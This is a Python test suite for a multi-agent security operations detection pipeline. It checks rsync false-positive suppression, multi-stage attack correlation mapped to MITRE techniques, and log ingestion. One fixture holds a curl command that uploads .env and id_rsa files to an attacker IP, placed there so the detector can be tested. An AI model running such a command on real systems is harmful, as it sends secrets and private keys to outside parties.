"""
test_soc_enhancement.py
=======================
Comprehensive End-to-End Validation Test Suite for Multi-Agent SOC Architecture Upgrade:
  1. Content & Context Inspection (Distinguishing Genuine High-Volume from Malicious Exfiltration)
  2. Smart Attack Sequence Correlation (Temporal MITRE ATT&CK Kill-Chain Tracking)
  3. Real-Time Telemetry Pipeline (System Log Ingestion through SOCPipeline)
  4. Context-Aware Threat Assessment & Explainable LLM Reasoning
"""

import copy
import datetime
import pathlib
import sys
import time
import uuid
import pytest

PROJECT_ROOT = pathlib.Path(__file__).resolve().parent
sys.path.insert(0, str(PROJECT_ROOT))

from agents.alert_correlation.agent import AlertCorrelationAgent
from agents.alert_correlation.config import (
    STAGE_DATA_STAGING,
    STAGE_EXFILTRATION,
    STAGE_INITIAL_ACCESS,
    STAGE_PRIVILEGE_ESCALATION,
    STAGE_RECONNAISSANCE,
)
from agents.content_inspection.agent import ContentInspectionAgent
from agents.content_inspection.config import (
    VERDICT_BENIGN_ROUTINE,
    VERDICT_EXFILTRATION_CRITICAL,
    VERDICT_GENUINE_USER_HIGH_VOLUME,
)
from agents.threat_assessment.agent import ThreatAssessmentEngine
from agents.threat_assessment.config import (
    CATEGORY_BENIGN,
    CATEGORY_CONFIRMED_ATTACK,
    CATEGORY_SUSPECTED_ATTACK,
    CATEGORY_SUSPICIOUS_ANOMALY,
    SEVERITY_HIGH,
    SEVERITY_LOW,
    SEVERITY_MEDIUM,
)
from agents.threat_investigation.coordinator import ThreatInvestigationCoordinator
from agents.llm_reasoning.agent import GeminiReasoningAgent
from agents.llm_reasoning.provider import MockReasoningProvider
from kafka.consumer import SOCPipeline


# ===========================================================================
# 1. Genuine User High-Volume Data Transfer Tests
# ===========================================================================

def test_genuine_user_high_volume_false_positive_suppression():
    """
    Simulates a genuine developer or system backup transferring 250MB via rsync.
    Even if Anomaly Detection flags statistical anomaly due to large byte volume,
    Content & Context Inspection verifies benign process/content, suppressing the false positive.
    """
    ci_agent = ContentInspectionAgent()
    threat_engine = ThreatAssessmentEngine(log_to_file=False)
    investigation_coord = ThreatInvestigationCoordinator(log_to_file=False)
    reasoning_agent = GeminiReasoningAgent(provider=MockReasoningProvider(), log_to_file=False)

    event_id = str(uuid.uuid4())

    # Step 1: Content inspection of rsync backup
    ci_report = ci_agent.inspect_transfer(
        event_id=event_id,
        files=["family_vacation.mp4", "media_assets.tar"],
        process_name="rsync",
        command_line="rsync -az /var/backups/ backup-srv.internal:/nas/backups",
        user="ubuntu",
        destination="192.168.1.100",
        volume_bytes=250 * 1024 * 1024,
        preceding_compromise=False,
    )
    assert ci_report["verdict"] == VERDICT_GENUINE_USER_HIGH_VOLUME
    assert ci_report["is_attack"] is False
    assert ci_report["is_high_volume"] is True

    # Step 2: Threat Assessment with simulated Anomaly alert (Outlier due to 250MB transfer)
    mock_network_alert = {
        "event_id": event_id,
        "agent": "Network Detection Agent",
        "prediction": "Benign",
        "confidence": 0.94,
        "severity": "LOW",
    }
    mock_anomaly_alert = {
        "event_id": event_id,
        "agent": "Anomaly Detection Agent",
        "prediction": "Anomalous",
        "anomaly_score": -0.38,  # Outlier
        "severity": "HIGH",
    }

    assessment = threat_engine.assess(
        network_alert=mock_network_alert,
        anomaly_alert=mock_anomaly_alert,
        event_id=event_id,
        content_inspection=ci_report,
    )

    # Crucial Validation: False positive suppressed! Category must be Benign, not Suspicious Anomaly!
    assert assessment["category"] == CATEGORY_BENIGN
    assert assessment["severity"] == SEVERITY_LOW
    assert "False positive suppressed" in assessment["explanation"]
    assert assessment["content_inspection"]["verdict"] == VERDICT_GENUINE_USER_HIGH_VOLUME

    # Step 3: Investigation closes gracefully as benign
    investigation = investigation_coord.investigate(
        event_id=event_id,
        network_alert=mock_network_alert,
        anomaly_alert=mock_anomaly_alert,
        threat_assessment=assessment,
        content_inspection=ci_report,
        force=True,
    )
    assert investigation["investigation_status"] == "CLOSED_BENIGN"
    assert "GENUINE OPERATION" in investigation["summary"]

    # Step 4: Reasoning agent provides explainable conclusion
    reasoning = reasoning_agent.reason_incident(
        threat_assessment=assessment,
        threat_investigation=investigation,
        force=True,
    )
    assert reasoning["status"] == "SUCCESS"
    assert "Genuine User" in reasoning["output"]["likely_attack"]
    assert reasoning["output"]["mitre_techniques"] == []


# ===========================================================================
# 2. Coordinated Multi-Stage Attack Progression Correlation Tests
# ===========================================================================

def test_multi_stage_attack_sequence_correlation():
    """
    Simulates a full 5-stage temporal attack progression from attacker IP 45.33.32.156:
      Stage 1: Reconnaissance (SYN burst / port probe)
      Stage 2: Initial Access (Brute force SSH failed attempts in auth.log)
      Stage 3: Privilege Escalation (Sudo execution by compromised user)
      Stage 4: Data Staging (.env and id_rsa access)
      Stage 5: Exfiltration (Outbound transfer via curl to external C2)

    Validates that AlertCorrelationAgent detects the temporal sequence,
    generates a CRITICAL Coordinated Attack Sequence incident, and maps MITRE techniques.
    """
    corr_agent = AlertCorrelationAgent(window_seconds=600)
    corr_agent.clear_windows()

    attacker_ip = "45.33.32.156"
    victim_host = "victim-vm"

    # Stage 1: Reconnaissance Telemetry
    flow_event_recon = {
        "event_id": f"evt-recon-{uuid.uuid4().hex[:6]}",
        "src_ip": attacker_ip,
        "dst_ip": "192.168.1.50",
        "features": {
            "SYN Flag Cnt": 1,
            "Tot Fwd Pkts": 80,
            "Tot Bwd Pkts": 0,
            "Dst Port": 0,
        },
    }
    recon_inc = corr_agent.ingest_telemetry(event=flow_event_recon)
    assert recon_inc is None  # Single stage does NOT trigger sequence incident

    # Verify state after stage 1
    state1 = corr_agent.get_entity_state(attacker_ip)
    assert STAGE_RECONNAISSANCE in state1["stages_observed"]
    assert state1["has_compromise"] is False

    # Stage 2: Initial Access (Host system log)
    log_initial_access = {
        "log_id": f"log-auth-{uuid.uuid4().hex[:6]}",
        "service": "sshd",
        "log_type": "auth_failure",
        "source_host": victim_host,
        "message": f"Failed password for invalid user admin from {attacker_ip} port 49152 ssh2",
        "user": "admin",
    }
    access_inc = corr_agent.ingest_telemetry(system_log=log_initial_access)

    # Now 2 stages observed for attacker_ip (Recon + Initial Access) -> Sequence incident generated!
    assert access_inc is not None
    assert access_inc["incident_type"] == "ATTACK_SEQUENCE"
    assert access_inc["is_coordinated_attack"] is True
    assert STAGE_RECONNAISSANCE in access_inc["stages_detected"]
    assert STAGE_INITIAL_ACCESS in access_inc["stages_detected"]
    assert corr_agent.has_preceding_compromise(attacker_ip) is True

    # Stage 3: Privilege Escalation
    log_priv_esc = {
        "log_id": f"log-sudo-{uuid.uuid4().hex[:6]}",
        "service": "sudo",
        "log_type": "privilege_escalation",
        "source_host": victim_host,
        "message": f"user=www-data : COMMAND=/bin/bash ; remote_ip={attacker_ip}",
        "user": "www-data",
    }
    priv_inc = corr_agent.ingest_telemetry(system_log=log_priv_esc)
    assert priv_inc is not None
    assert STAGE_PRIVILEGE_ESCALATION in priv_inc["stages_detected"]

    # Stage 4 & 5: Data Staging & Exfiltration via Content Inspection
    ci_agent = ContentInspectionAgent()
    ci_exfil_report = ci_agent.inspect_transfer(
        event_id=f"evt-exfil-{uuid.uuid4().hex[:6]}",
        files=[".env", "id_rsa"],
        process_name="curl",
        command_line=f"curl -F file=@.env http://{attacker_ip}:8080/drop",
        user="www-data",
        destination=attacker_ip,
        volume_bytes=15000,
        preceding_compromise=corr_agent.has_preceding_compromise(attacker_ip),
    )
    assert ci_exfil_report["verdict"] == VERDICT_EXFILTRATION_CRITICAL
    assert ci_exfil_report["is_attack"] is True

    full_attack_inc = corr_agent.ingest_telemetry(content_report=ci_exfil_report)
    assert full_attack_inc is not None
    assert full_attack_inc["severity"] == "CRITICAL"
    assert STAGE_EXFILTRATION in full_attack_inc["stages_detected"]
    assert STAGE_DATA_STAGING in full_attack_inc["stages_detected"]
    assert len(full_attack_inc["mitre_techniques"]) >= 5
    assert "T1046" in full_attack_inc["mitre_techniques"]
    assert "T1110" in full_attack_inc["mitre_techniques"]
    assert "T1548" in full_attack_inc["mitre_techniques"]
    assert "T1048" in full_attack_inc["mitre_techniques"]

    # Verify downstream Threat Assessment for the coordinated sequence
    threat_engine = ThreatAssessmentEngine(log_to_file=False)
    threat_assessment = threat_engine.assess(
        event_id=full_attack_inc["incident_id"],
        content_inspection=ci_exfil_report,
        sequence_incident=full_attack_inc,
    )
    assert threat_assessment["category"] == CATEGORY_CONFIRMED_ATTACK
    assert threat_assessment["severity"] == "CRITICAL"
    assert threat_assessment["is_coordinated_attack"] is True

    # Verify downstream LLM Reasoning synthesis
    reasoning_agent = GeminiReasoningAgent(provider=MockReasoningProvider(), log_to_file=False)
    reasoning = reasoning_agent.reason_incident(
        incident=full_attack_inc,
        threat_assessment=threat_assessment,
        force=True,
    )
    assert reasoning["status"] == "SUCCESS"
    assert "Coordinated Multi-Stage Attack" in reasoning["output"]["likely_attack"]
    assert len(reasoning["output"]["mitre_techniques"]) >= 3


# ===========================================================================
# 3. Real-Time Pipeline System Log Ingestion Tests
# ===========================================================================

def test_pipeline_process_system_log():
    """
    Validates SOCPipeline.process_system_log() directly:
    Ensures logs are ingested, content inspected, state updated, and persisted.
    """
    pipeline = SOCPipeline(log_alerts=False)

    log_payload = {
        "log_id": f"test-log-{uuid.uuid4().hex[:8]}",
        "service": "rsync",
        "log_type": "TRANSFER",
        "severity": "INFORMATIONAL",
        "message": "rsync -avz /home/developer/code/ backup.local:/data",
        "source_host": "test-dev-vm",
        "user": "developer",
        "volume_bytes": 100 * 1024 * 1024,
    }

    res = pipeline.process_system_log(log_payload, persist=False)
    assert res["status"] == "PROCESSED"
    assert res["service"] == "rsync"
    assert res["content_inspection"] is not None
    assert res["content_inspection"]["verdict"] == VERDICT_GENUINE_USER_HIGH_VOLUME


# ===========================================================================
# 4. Temporal Sliding Window Boundary Tests
# ===========================================================================

def test_temporal_sliding_window_expiration():
    """
    Validates that events older than the configured sliding window expire and do NOT
    falsely correlate with fresh events.
    """
    # 2-second short window for testing expiration
    agent = AlertCorrelationAgent(window_seconds=1)
    agent.clear_windows()

    entity = "198.51.100.99"

    # Ingest stage 1 event
    agent.ingest_telemetry(event={
        "event_id": "old-recon-1",
        "src_ip": entity,
        "features": {"SYN Flag Cnt": 1, "Tot Fwd Pkts": 50, "Tot Bwd Pkts": 0},
    })
    assert len(agent.get_entity_state(entity)["stages_observed"]) == 1

    # Sleep past window expiry
    time.sleep(1.2)

    # Ingest stage 2 event after old event has expired
    agent.ingest_telemetry(system_log={
        "log_id": "fresh-auth-1",
        "service": "sshd",
        "source_host": entity,
        "message": "Failed password for root",
    })

    # The old recon event should have pruned out, leaving only Initial Access
    state = agent.get_entity_state(entity)
    assert state["active_events_count"] == 1
    assert STAGE_INITIAL_ACCESS in state["stages_observed"]
    assert STAGE_RECONNAISSANCE not in state["stages_observed"]
